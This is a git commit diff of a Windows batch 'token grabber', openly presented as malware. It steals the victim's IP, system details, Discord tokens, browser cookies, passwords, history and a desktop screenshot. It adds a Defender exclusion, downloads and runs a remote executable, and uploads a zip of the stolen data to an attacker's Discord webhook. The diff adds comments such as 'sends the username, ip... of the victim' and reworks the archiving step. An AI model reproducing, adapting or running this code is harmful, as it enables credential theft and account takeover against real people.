8e1e698b79543688676cad81033c8b799adfe646
K.Dot <110929758+KDot227@users.noreply.github.com>
2022-09-25 21:54:30 -0500

    Update grabber.bat

--- grabber.bat
+++ grabber.bat
@@ -2,12 +2,12 @@
 :: Note as you can see a lot of this was by baum. I mainly just added back a working token grabber and injection and it took way longer than I'd like to admit. lol
 set webhook=YOUR_WEBHOOK_HERE
 ::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810
-
+::get ip
 curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
 set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
-
+::gets a list of all installed programms
 powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "
-
+::gets informations about the pc
 echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -16,13 +16,13 @@ echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
 wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
-
-
+:aftertesti
+::gets the ipconfig (also local ip)
 ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
-
+::gets the info about the netstat
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
-
+::sends the username, ip, current time, and date of the victim
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 taskkill /im Discord.exe /f
@@ -48,19 +48,19 @@ echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 
 
-
-
+::back to my code!
+::Whole ahh injection
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
-
+:: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
-
+:: FULL SRC FOR THE EXE IS ON MY GITHUB!!!
 timeout 3 >NUL
 start /w main.exe %webhook%
 timeout 3 >NUL
 taskkill /f /im main.exe
 
-powershell -Command "Compress-Archive -Path $env:TEMP\tokens.txt, $env:TEMP\browser-cookies.txt, $env:TEMP\browser-history.txt, $env:TEMP\browser-passwords.txt, $env:TEMP\desktop-screenshot.png, $env:TEMP\System_INFO.txt, $env:TEMP\sysi.txt, $env:TEMP\ip.txt, $env:TEMP\netstat.txt, $env:TEMP\programms.txt, $env:TEMP\uuid.txt -DestinationPath $env:TEMP\damnKDot.zip -CompressionLevel Optimal -Update" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%
+powershell -Command "try {Compress-Archive -Path $env:TEMP\tokens.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-cookies.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-history.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\browser-passwords.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\desktop-screenshot.png -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\System_INFO.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\sysi.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\ip.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\netstat.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\programms.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path $env:TEMP\uuid.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%
 
 del %userprofile%\AppData\Local\Temp\tokens.txt
 del %localappdata%\Temp\ip.txt
